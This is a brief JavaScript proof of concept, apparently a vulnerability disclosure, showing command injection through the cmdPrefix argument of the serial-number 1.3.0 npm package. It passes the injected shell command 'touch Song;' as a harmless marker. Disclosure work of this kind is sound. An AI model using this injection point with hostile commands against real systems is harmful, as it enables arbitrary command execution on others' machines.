/**
 * serial-number@1.3.0 is vulnerable to command injection.
 * the injection point is located in line 106 in index.js,
 * the cmdPrefix argument in serialNumber function can be controlled by user,
 * but there is no sanitization of the cmdPrefix
 */
var root = require("serial-number");
root(function(){},"touch Song;");
